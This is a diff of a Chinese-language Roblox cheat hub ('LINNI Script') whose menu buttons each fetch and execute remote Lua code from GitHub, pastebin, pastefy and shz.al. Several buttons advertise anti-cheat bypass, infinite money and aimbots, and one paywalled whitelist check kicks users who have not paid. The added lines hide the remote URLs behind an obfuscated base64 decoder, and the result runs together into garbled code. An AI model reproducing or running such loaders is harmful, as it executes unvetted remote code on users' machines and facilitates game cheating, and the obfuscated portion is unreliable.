-    loadstring(game:HttpGet("https://raw.githubusercontent.com/Turtle-Secure/Animal-Evolution-Simulator/main/.lua"))()
-end)
-
-local creds = window:Tab("浴缸战争脚本",'16060333448')
-
-local credits = creds:section("『LINNI Script』",true)
-    credits:Button("（升级演习）浴缸战争",function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/Alan0947383/Boom/main/Protected_1198219713372149.lua.txt",true))()
-end)
-    credits:Button("点我复制解密钥链接",function()
-    setclipboard("https://pandadevelopment.net/startkey.html?service=demonichubv2")
-end)
-
-local creds = window:Tab("飞行比赛脚本",'16060333448')
-
-local credits = creds:section("『LINNI Script』",true)
-    credits:Button("飞行比赛",function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/NightCoded/script/main/fly-race.lua"))()
-end)
-
-local creds = window:Tab("俄亥俄州",'16060333448')
-
-local credits = creds:section("『LINNI Script』",true)
-    credits:Button("俄亥俄州（老外1）",function()
-    loadstring(game:HttpGet("https://pastebin.com/raw/0MqfXpvY", true))()
-end)
-    credits:Button("俄亥俄州（老外2）",function()
-    loadstring(game:HttpGet('https://pastebin.com/raw/MyfCUnGK'))()
-end)
-    credits:Button("俄亥俄州（自动工作＋传送工作地点）",function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/LOLking123456/ohio/main/Roblox232"))()
-end)
-    credits:Button("俄亥俄州1",function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/rxn-xyz/Ohio./main/Ohio.lua",true))()
-end)
-    credits:Button("俄亥俄州2",function()
-    loadstring(game:HttpGet("https://pastefy.app/QbXPfsgC/raw"))()
-end)
-    credits:Button("剑客脚本",function()
-    jianke_V4 = "作者_初夏"jianke__V4 = "作者QQ1412152634"jianke___V4 = "剑客QQ群347724155"loadstring(game:HttpGet(('https://shz.al/~JianKeV4')))()
-end)
-
-local creds = window:Tab("The rake",'16060333448')
-
-local credits = creds:section("『LINNI Script』",true)
-    credits:Button("The rake电脑端",function()
-    loadstring(game:HttpGet("https://realzzhub.xyz/script.lua"))()
-end)
-
-local creds = window:Tab("兵工厂",'16060333448')
-
-local credits = creds:section("『LINNI Script』",true)
-    credits:Button("霖溺出品必属精品",function()
-    loadstring(game:HttpGet("https://shz.al/~KKAKSKKS"))()
-end)
-    credits:Button("最强更新绕过反作弊启动即可奔放",function()
-    loadstring(game:HttpGet("https://shz.al/~FGD"))()
-end)
-    credits:Button("兵工厂1",function()
-    loadstring(game:HttpGet(('https://raw.githubusercontent.com/RandomAdamYT/DarkHub/master/Init'), true))()
-end)
-    credits:Button("兵工厂无敌子追",function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/tbao143/thaibao/main/TbaoHubArsenal"))()
-end)
-    credits:Button("兵工厂",function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/GamingScripter/Darkrai-X/main/Games/Arsenal/MainFile"))()
-end)
-    credits:Button("兵工厂（名字相同脚本不同）",function()
-    loadstring(game:HttpGet("https://pastefy.app/2YdrWHxV/raw"))()
-end)
-    credits:Button("剑客脚本",function()
-    jianke_V4 = "作者_初夏"jianke__V4 = "作者QQ1412152634"jianke___V4 = "剑客QQ群347724155"loadstring(game:HttpGet(('https://shz.al/~JianKeV4')))()
-end)
-
-local creds = window:Tab("餐厅大亨",'16060333448')
-
-local credits = creds:section("『LINNI Script』",true)
-    credits:Button("餐厅大亨无限钱",function()
-    loadstring(game:HttpGet("https://shz.al/~zkzkzisKAKAKK"))()
-end)
-    credits:Button("餐厅大亨（名字相同脚本不同）",function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/toosiwhip/snake-hub/main/restaurant-tycoon-2.lua"))()
-end)
-    credits:Button("餐厅大亨（名字相同脚本不同）",function()
-    loadstring(game:HttpGet("https://pastefy.app/Ppqt0Gib/raw"))()
-end)
-    credits:Button("剑客脚本",function()
-    jianke_V4 = "作者_初夏"jianke__V4 = "作者QQ1412152634"jianke___V4 = "剑客QQ群347724155"loadstring(game:HttpGet(('https://shz.al/~JianKeV4')))()
-end)
-
-local creds = window:Tab("超级大力士模拟器",'16060333448')
-
-local credits = creds:section("『LINNI Script』",true)
-    credits:Button("超级大力士模拟器（名字相同脚本不同）",function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/ToraIsMe2/ToraIsMe2/main/0strongman", true))()
-end)
-    credits:Button("超级大力士模拟器（名字相同脚本不同）",function()
-    loadstring(game:HttpGet("https://pastefy.app/aO18ZEB9/raw"))()
-end)
-    credits:Button("剑客脚本",function()
-    jianke_V4 = "作者_初夏"jianke__V4 = "作者QQ1412152634"jianke___V4 = "剑客QQ群347724155"loadstring(game:HttpGet(('https://shz.al/~JianKeV4')))()
-end)
-
-local creds = window:Tab("举重模拟器",'16060333448')
-
-local credits = creds:section("『LINNI Script』",true)
-    credits:Button("举重模拟器祝你玩的开心",function()
-    loadstring(game:HttpGet("https://shz.al/~HHHSUSUKSKS"))()
-end)
-    credits:Button("举重模拟器",function()
-    loadstring(game:HttpGet("https://pastefy.app/KSriAk53/raw"))()
-end)
-    credits:Button("剑客脚本",function()
-    jianke_V4 = "作者_初夏"jianke__V4 = "作者QQ1412152634"jianke___V4 = "剑客QQ群347724155"loadstring(game:HttpGet(('https://shz.al/~JianKeV4')))()
+local credits = creds:section(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('PwKnHyusUDWmcwpcIIPGBZQAdFveMgLZpTqLodmsoaXUgOCBHdPYWwYTZXpoNPZYKWZPis44CO5Y2h5a+G5qih5byP44CP'),true)
+    credits:Button(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('CiwFTMkAHtoaNlLRqKDKswEenDaiTVVLFoOrcBxGIjpyAzuPsKUJNJohxNbNqQKibOkPTgU29s')s RNGtZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('rfDZPQivuZVaKLimUwkYMMolgcvoVtxLaYFJINLWihYddmMlVKcTwYltaBgXzEuEdVlezULGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://raw.githubusercontent.com/Alan0947383/Demonic-HUB-V2/main/S-C-R-I-P-T.luatZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('oYyXdjWGcHhaEYlZjbTJqBTFjVqvNuaDOCZGtRbVWqwOnmPBhpBEexbYNpjDWeoZRDdxetLHRydWUpKSgpDQplbmQpDQogICAgY3JlZGl0czpCdXR0b24o')点击我复制密钥链接tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('ITVXayXJMjsOmAFLAKLNyyGKSnXWKrIsztbvEPqtfepuJhRwjKPuqWjBtdiImWIWPCHXsFLGZ1bmN0aW9uKCkNCiAgICBzZXRjbGlwYm9hcmQo')https://pandadevelopment.net/startkey.html?service=demonichubv2tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('ISDwVFIUhnkAOOQtaaGpJdKeuKYRtqpYvOFJsMwWXWcvvSKtDBftNefBDArkZLmhzuYMrRKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')热乎呢刚找的SoltZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('mYmQFSojwdAYTPCOdjCpuIzwPOGIAhkOALafsBAsxJITdPiLsdVauLzvXDplQRgybJJgXmcyBSTkc='),function()
+    loadstring(game:HttpGet(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('loJXhxtvnJxKNqgjjrRXAEYeoihnBDnzUhzLUBtljEExUqiBrTPrklDLNofEdUqjNfcbNXaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1JhaC1NZC9Tb2wtUmduLVNjcmlwdHMvbWFpbi9VcGQubHVh')))()
 end)
-
-local creds = window:Tab("怪兽宇宙",'16060333448')
-
-local credits = creds:section("『LINNI Script』",true)
-    credits:Button("怪兽宇宙",function()
-    loadstring(game:HttpGet("https://pastefy.app/oRWEIEcJ/raw"))()
-end)
-
-local creds = window:Tab("铲雪模拟器脚本",'16060333448')
-
-local credits = creds:section("『LINNI Script』",true)
-    credits:Button("铲雪模拟器",function()
-    loadstring(game:HttpGet("https://shz.al/~KJAKAKSKKS"))()
-end)
-
-local creds = window:Tab("幸运方块",'16060333448')
-
-local credits = creds:section("『LINNI Script』",true)
-    credits:Button("剑客脚本",function()
-    jianke_V4 = "作者_初夏"jianke__V4 = "作者QQ1412152634"jianke___V4 = "剑客QQ群347724155"loadstring(game:HttpGet(('https://shz.al/~JianKeV4')))()
-end)
-
-local creds = window:Tab("汽车经销大亨",'16060333448')
-
-local credits = creds:section("『LINNI Script』",true)
-    credits:Button("汽车经销大亨（名字相同脚本不同）",function()
-    loadstring(game:HttpGet("https://pastefy.app/5o594Q0i/raw"))()
-end)
-    credits:Button("汽车经销大亨（名字相同脚本不同）",function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/03sAlt/BlueLockSeason2/main/README.md"))()
-end)
-    credits:Button("汽车经销大亨（收集所有砖头）",function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/IExpIoit/Script/main/Car%20Dealership%20Tycoon.lua"))()
-end)
-    credits:Button("剑客脚本",function()
-    jianke_V4 = "作者_初夏"jianke__V4 = "作者QQ1412152634"jianke___V4 = "剑客QQ群347724155"loadstring(game:HttpGet(('https://shz.al/~JianKeV4')))()
-end)
-
-local creds = window:Tab("寻宝模拟器",'16060333448')
-
-local credits = creds:section("『LINNI Script』",true)
-    credits:Button("寻宝模拟器『霖溺汉化』",function()
-    loadstring(game:HttpGet("https://shz.al/~MKS"))()
-end)
-    credits:Button("剑客脚本",function()
-    jianke_V4 = "作者_初夏"jianke__V4 = "作者QQ1412152634"jianke___V4 = "剑客QQ群347724155"loadstring(game:HttpGet(('https://shz.al/~JianKeV4')))()
-end)
-
-local creds = window:Tab("拳击模拟器",'16060333448')
-
-local credits = creds:section("『LINNI Script』",true)
-    credits:Button("拳击模拟器（名字相同脚本不同）",function()
-    loadstring(game:HttpGet("https://pastefy.app/T4O1SA3q/raw"))()
-end)
-    credits:Button("拳击模拟器（名字相同脚本不同）",function()
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/Solx69/Shit-Boy-Hub-Main/main/Master.lua'))()
-end)
-    credits:Button("剑客脚本",function()
-    jianke_V4 = "作者_初夏"jianke__V4 = "作者QQ1412152634"jianke___V4 = "剑客QQ群347724155"loadstring(game:HttpGet(('https://shz.al/~JianKeV4')))()
-end)
-
-local creds = window:Tab("伐木大亨",'16060333448')
-
-local credits = creds:section("『LINNI Script』",true)
-    credits:Button("伐木大亨（听说最强）",function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/frencaliber/LuaWareLoader.lw/main/luawareloader.wtf",true))()
-end)
-    credits:Button("想白的老外脚本",function()
-    loadstring(game:HttpGet('https://getexploits.com/key-system/',true))('https://da.com/936657404291084298/1006220505583460352/Script.txt')
-end)
-    credits:Button("白脚本（不知道能不能用）",function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/CloudX-ScriptsWane/ScriptsDache/main/%E4%BC%90%E6%9C%A8%E5%A4%A7%E4%BA%A822.lua", true))()
-end)
-    credits:Button("伐木大亨",function()
-    loadstring(game:HttpGet("https://shz.al/~/dkfkfkfjfkfjdj/longshu/main/lllllkllllllll"))()
-end)
-    credits:Button("剑客脚本",function()
-    jianke_V4 = "作者_初夏"jianke__V4 = "作者QQ1412152634"jianke___V4 = "剑客QQ群347724155"loadstring(game:HttpGet(('https://shz.al/~JianKeV4')))()
-end)
-
-local creds = window:Tab("绵羊大亨脚本",'16060333448')
-
-local credits = creds:section("『LINNI Script』",true)
-    credits:Button("绵羊大亨『小天』",function()
-    loadstring(game:HttpGet(('https://shz.al/PHep')))()
-end)
-
-local creds = window:Tab("最强战场",'16060333448')
-
-local credits = creds:section("『LINNI Script』",true)
-    credits:Button("最强战场能用",function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/Scripterbacon/TSBobfuscator/main/Main.Lua"))()
-end)
-local credits = creds:section("『需要密钥脚本』",true)
-    credits:Button("需要密钥自己加dc",function()
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/DrakainnnDL/Script/main/TheStrongestBattle'))()
-end)
-    credits:Button("点击我复制dc",function()
-    setclipboard("https://discord.gg/Mbh9NRd8")
-end)
-    credits:Button("剑客脚本",function()
-    jianke_V4 = "作者_初夏"jianke__V4 = "作者QQ1412152634"jianke___V4 = "剑客QQ群347724155"loadstring(game:HttpGet(('https://shz.al/~JianKeV4')))()
-end)
-
-local creds = window:Tab("奎尔湖",'16060333448')
-
-local credits = creds:section("『LINNI Script』",true)
-    credits:Button("奎尔湖",function()
-    loadstring(game:HttpGet("https://pastefy.app/ZwaXa3ZR/raw"))()
-end)
-    credits:Button("剑客脚本",function()
-    jianke_V4 = "作者_初夏"jianke__V4 = "作者QQ1412152634"jianke___V4 = "剑客QQ群347724155"loadstring(game:HttpGet(('https://shz.al/~JianKeV4')))()
-end)
-    credits:Button("刺客脚本只适配忍者和FL注入器",function()
-    loadstring(game:HttpGet("https://shz.al/~CikeScriptfree"))()
-end)
-
-local creds = window:Tab("格林维尔",'16060333448')
-
-local credits = creds:section("『LINNI Script』",true)
-    credits:Button("格林维尔",function()
-    loadstring(game:HttpGet("https://pastefy.app/WBYAsWJm/raw"))()
-end)
-    credits:Button("剑客脚本",function()
-    jianke_V4 = "作者_初夏"jianke__V4 = "作者QQ1412152634"jianke___V4 = "剑客QQ群347724155"loadstring(game:HttpGet(('https://shz.al/~JianKeV4')))()
-end)
-
-local creds = window:Tab("恐怖奶奶",'16060333448')
-
-local credits = creds:section("『LINNI Script』",true)
-    credits:Button("恐怖奶奶",function()
-    loadstring(game:HttpGet("https://pastefy.app/o688Jvmn/raw"))()
-end)
-    credits:Button("剑客脚本",function()
-    jianke_V4 = "作者_初夏"jianke__V4 = "作者QQ1412152634"jianke___V4 = "剑客QQ群347724155"loadstring(game:HttpGet(('https://shz.al/~JianKeV4')))()
-end)
-
-local creds = window:Tab("奶酪逃亡",'16060333448')
-
-local credits = creds:section("『LINNI Script』",true)
-    credits:Button("奶酪逃亡",function()
-    loadstring(game:HttpGet("https://pastefy.app/IIpzN8f5/raw"))()
+    credits:Button(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('BfrAwCaqAnswyTTyAJMwzjGprfmlzvvuigoCHNhHGGLsGheIEjgaoglrCcLTcDoRlwuxrH54K55Ye75oiR5aSN5Yi26ZO+5o6l'),function()
+    setclipboard(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('DAIdqhXIwIEOUUXpQelncWUGDiEcIXdYMeEMQSbLeyPOBZPmyGIebQmvwwqYgXSIAFYiOOaHR0cHM6Ly9saW5rdmVydGlzZS5jb20vMTA0NTgyOS9zb2wtcmduLXNjcmlwdC11cGQ/bz1zaGFyaW5n'))
 end)
-
-local creds = window:Tab("我的餐厅",'16060333448')
-
-local credits = creds:section("『LINNI Script』",true)
-    credits:Button("我的餐厅（不确定是手机端）",function()
-    loadstring(game:HttpGet("http://void-scripts.com/Scripts/myRest.lua"))()
-end)
-    credits:Button("我的餐厅",function()
-    loadstring(game:HttpGet("https://pastefy.app/5R1Ch6kk/raw"))()
-end)
-    credits:Button("剑客脚本",function()
-    jianke_V4 = "作者_初夏"jianke__V4 = "作者QQ1412152634"jianke___V4 = "剑客QQ群347724155"loadstring(game:HttpGet(('https://shz.al/~JianKeV4')))()
-end)
-
-local creds = window:Tab("钓鱼模拟器",'16060333448')
-
-local credits = creds:section("『LINNI Script』",true)
-    credits:Button("钓鱼模拟器（1英文）",function()
-    loadstring(game:HttpGet("https://shz.al/~LNINIGGDHH"))()
-end)
-    credits:Button("钓鱼模拟器（2英文）",function()
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/reddythedev/Reddy-Hub/main/_Loader'))()
-end)
-    credits:Button("钓鱼模拟器（3英文）",function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/bebedi15/SRM-Scripts/main/Bebedi9960/SRMHub"))()
-end)
-    credits:Button("剑客脚本",function()
-    jianke_V4 = "作者_初夏"jianke__V4 = "作者QQ1412152634"jianke___V4 = "剑客QQ群347724155"loadstring(game:HttpGet(('https://shz.al/~JianKeV4')))()
-end)
-
-local creds = window:Tab("旗帜战争",'16060333448')
-
-local credits = creds:section("『LINNI Script』",true)
-    credits:Button("旗帜战争（名字相同脚本不同）",function()
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/Infinity2346/Tect-Menu/main/Flag%20Wars.txt'))()
-end)
-    credits:Button("旗帜战争（名字相同脚本不同）",function()
-    loadstring(game:HttpGet("https://pastefy.app/otEg6PJV/raw"))()
-end)
-
-local creds = window:Tab("法宝模拟器",'16060333448')
-
-local credits = creds:section("『LINNI Script』",true)
-    credits:Button("法宝模拟器",function()
-    loadstring(game:HttpGet("https://pastefy.app/9bGpv4H3/raw"))()
-end)
-    credits:Button("法宝模拟器（汉化）",function()
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/zhanghuihuihuil/Script/main/%E6%B3%95%E5%AE%9D%E6%A8%A1%E6%8B%9F%E5%99%A8%E6%B1%89%E5%8C%96'))()
-end)
-    credits:Button("剑客脚本",function()
-    jianke_V4 = "作者_初夏"jianke__V4 = "作者QQ1412152634"jianke___V4 = "剑客QQ群347724155"loadstring(game:HttpGet(('https://shz.al/~JianKeV4')))()
-end)
-
-local creds = window:Tab("极速奔驰",'16060333448')
-
-local credits = creds:section("『LINNI Script』",true)
-    credits:Button("极速奔驰",function()
-    loadstring(game:HttpGet("https://pastefy.app/Y7607jwb/raw"))()
-end)
-    credits:Button("剑客脚本",function()
-    jianke_V4 = "作者_初夏"jianke__V4 = "作者QQ1412152634"jianke___V4 = "剑客QQ群347724155"loadstring(game:HttpGet(('https://shz.al/~JianKeV4')))()
-end)
-
-local creds = window:Tab("射击光束模拟器",'16060333448')
-
-local credits = creds:section("『LINNI Script』",true)
-    credits:Button("射击光束模拟器",function()
-    loadstring(game:HttpGet("https://pastefy.app/51yMuaCc/raw"))()
-end)
-    credits:Button("剑客脚本",function()
-    jianke_V4 = "作者_初夏"jianke__V4 = "作者QQ1412152634"jianke___V4 = "剑客QQ群347724155"loadstring(game:HttpGet(('https://shz.al/~JianKeV4')))()
-end)
-
-local creds = window:Tab("合并滴管",'16060333448')
-
-local credits = creds:section("『LINNI Script』",true)
-    credits:Button("合并滴管",function()
-    loadstring(game:HttpGet("https://pastefy.app/NpBrBCqM/raw"))()
-end)
-    credits:Button("剑客脚本",function()
-    jianke_V4 = "作者_初夏"jianke__V4 = "作者QQ1412152634"jianke___V4 = "剑客QQ群347724155"loadstring(game:HttpGet(('https://shz.al/~JianKeV4')))()
-end)
-
-local creds = window:Tab("成为跑酷忍者脚本",'16060333448')
-
-local credits = creds:section("『LINNI Script』",true)
-    credits:Button("成为跑酷忍者",function()
-    loadstring(game:HttpGet(('https://shz.al/~XiaoTian/Script/yyds')))()
-end)
-
-local creds = window:Tab("动感星期五",'16060333448')
-
-local credits = creds:section("『LINNI Script』",true)
-    credits:Button("动感星期五（Auto Click）",function()
-    loadstring(game:HttpGet("https://scriptblox.com/raw/XMAS-Event-or-Funky-Friday-Auto-Player-Mobile-6721"))()
-end)
-    credits:Button("动感星期五（自动PK）",function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/wally-rblx/funky-friday-autoplay/main/main.lua",true))()
-end)
-    credits:Button("动感星期五",function()
-    loadstring(game:HttpGet("https://scriptblox.com/raw/XMAS-Event-or-Funky-Friday-Auto-Player-Mobile-6721"))()
-end)
-    credits:Button("剑客脚本",function()
-    jianke_V4 = "作者_初夏"jianke__V4 = "作者QQ1412152634"jianke___V4 = "剑客QQ群347724155"loadstring(game:HttpGet(('https://shz.al/~JianKeV4')))()
-end)
-
-local creds = window:Tab("活过杀手",'16060333448')
-
-local credits = creds:section("『LINNI Script』",true)
-    credits:Button("活过杀手（垃圾）",function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/Milan08Studio/ChairWare/main/main.lua"))()
-end)
-    credits:Button("剑客脚本（里面的通用）",function()
-    jianke_V4 = "作者_初夏"jianke__V4 = "作者QQ1412152634"jianke___V4 = "剑客QQ群347724155"loadstring(game:HttpGet(('https://shz.al/~JianKeV4')))()
-end)
-
-local creds = window:Tab("起床战争",'16060333448')
-
-local credits = creds:section("『LINNI Script』",true)
-    credits:Button("起床vape",function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/7GrandDadPGN/VapeV4ForRoblox/main/NewMainScript.lua", true))()
-end)
-
-local creds = window:Tab("RELEASE + EVENT The Heroes Simulator",'16060333448')
-
-local credits = creds:section("『LINNI Script』",true)
-    credits:Button("Demonic HUB V2脚本",function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/Alan0947383/Demonic-HUB-V2/main/S-C-R-I-P-T.lua",true))()
-end)
-
-local creds = window:Tab("ZapHub The Best PS99 Script (Fast Version) ",'16060333448')
-
-local credits = creds:section("密钥链接https://linkvertise.com/608384/zaphub-key-system",true)
-    credits:Button("ZapHub The Best PS99 Script (Fast Version) ",function()
-    loadstring(game:HttpGet('https://www.zaphub.xyz/ExecPS99FV'))()
-end)
-
-local creds = window:Tab("超级联赛足球",'16060333448')
 
-local credits = creds:section("踢足球",true)
-    credits:Button("菜单一",function()
-    loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/8fdf7c482d3b3d108ccdb282a7fc35e2.lua"))()
-end)
-    credits:Button("菜单二",function()
-    loadstring(game:HttpGet"https://raw.githubusercontent.com/xtrey10x/xtrey10x-hub/main/neo")()
-end)
-else
-game.Players.LocalPlayer:Kick("『LINNI Script』要白名单，霖溺脚本持续更新，脚本良心三元，进群932613422找管理霖溺买，由于左边列表不能添加服务器了，所以在本脚本里面加个后续，在作者脚本里面看")--踢人函数
+local credits = creds:section(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('hrDNtchQBAdoVLIiBdnbzUdJtSnIFHxpogOMvAlqlVdYSmUppAjkkSQOtmkexyaHitckaI44CO5YWN6LS55qih5byP44CP'),true)
+    credits:Button(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('lAXbPUaPKRSdPLzPXxVAbZNYggYDAyEaBwVORAOEPBaxyihpluVzpAyjaJitcFiDrIsEkqU29s')s RNGtZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('AFKJLlOaeZQARNdVAcFnDGrPpulbrwrNFdzjgTckLPdEEnEDWsGpjBNCJsKrWepmkOxDGLLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://raw.githubusercontent.com/Looser3itx/Hmmmmmmmmmmmmmmmmmmmmmmmmmmmm/main/loader.luatZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('ctEbEmNlxwaZvofytNzBYDuWSoCWggbHRHWIGMyZoWYBvqtztPvYpQPLZKznoiaqfcYNBlKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')hubtZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('CgVSOvdcVZJFetDQRVAfxPOKOtSNVoPomGbNQqUaGdhuPDoQdJvnzZnJfVuAFDFiNzazohLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://shz.al/~JAJSNN233tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('lxPQqrtUDLgnBRsdjYZrhwMJSMPmrioaKWpmdUnEzpnIRIGfyaMyTNkjwKWcLXlMUgObQCKSkoKQ0KZW5kKQ0KDQpsb2NhbCBjcmVkcyA9IHdpbmRvdzpUYWIo')力量传奇tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('wCRAzCRYyHQUZECPMbHFMZHcJePcLQOvgKZpLAQBmIJJiPpumOknhhMRIjoZruAVDHXvyiLA==')16060333448tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('dZJzNDZbGsWhluofIZQnxoIlcDwOUXvAUorbzuApAtoLVMAAdsWIppnvaxRlYHCcCztnILKQ0KDQpsb2NhbCBjcmVkaXRzID0gY3JlZHM6c2VjdGlvbig=')自制为云脚本uitZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('xZHDDstmBRteOikaXXtBhSqbboVYkHruiPvMWeanOmPqqWFesELByKGOBKYfswuPvxIwxNLHRydWUpDQogICAgY3JlZGl0czpCdXR0b24o')新力量传奇修复版tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('dsVixxEUuZvjzAXSQrHzfUsRlXuRAvfZTxSjGGZPJUaGTMCLYlIWPvnACbDPIsLGEKhgPrLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://shz.al/~ANJSJStZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('RlBAefhqiMHKlcvKOwQQCHxmHXHvNIyvWIMqsRiQyzkhlBuYUTqnVcVHbswGKxfdJGhFgwKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')霖溺力量传奇（来源白貓）tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('ulSOIwnmHWWsaEPrPKRFSdWikelsHKjKcdQKtfLPLNexnuMMRfZpncjWBxevpzrKDPQVsHLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://shz.al/~baimaomeilitZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('GOfAvfFqUYaasiAfwutFyHzcFksvmzJTQgsdHxdSzVjBEDNQtsSsCmhMHetPaxQHCnsMyCKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')剑客脚本tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('kcZBPiGdaLKWtQJxYppkpgLvFQVzEbegDbUOOdjoyLRxYPuhvulMYGAVxEQKgiZFNjnwhpLGZ1bmN0aW9uKCkNCiAgICBqaWFua2VfVjQgPSA=')作者_初夏tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('vfoQqnYjwCadaRomkLltsFjfzQnORSbKcUObVbdlOTsOnjuTaiAgNwtQAeilMPreOPDrPpamlhbmtlX19WNCA9IA==')作者QQ1412152634tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('vZtCrAKiebosRLalybmaDQitPTmSuBKlCuhUjkJJkMjvAFkBtAtSdwDpaqApFoEEqYMkGfamlhbmtlX19fVjQgPSA=')剑客QQ群347724155tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('NWZaxBIZpqYAXyFVoLvaLMxChpPaGIHbuNbQCPIxHsolBvowFhiegQcIgzJftecoyUvCvbbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoKA==')https://shz.al/~JianKeV4tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('QzFQiiLPPEXrDVsQIiRHjlXWoKNReOhWoGfqMrNvmmFPrqhDlErENdGynDBzzuizSXqZxFKSkpKCkNCmVuZCkNCg0KbG9jYWwgY3JlZHMgPSB3aW5kb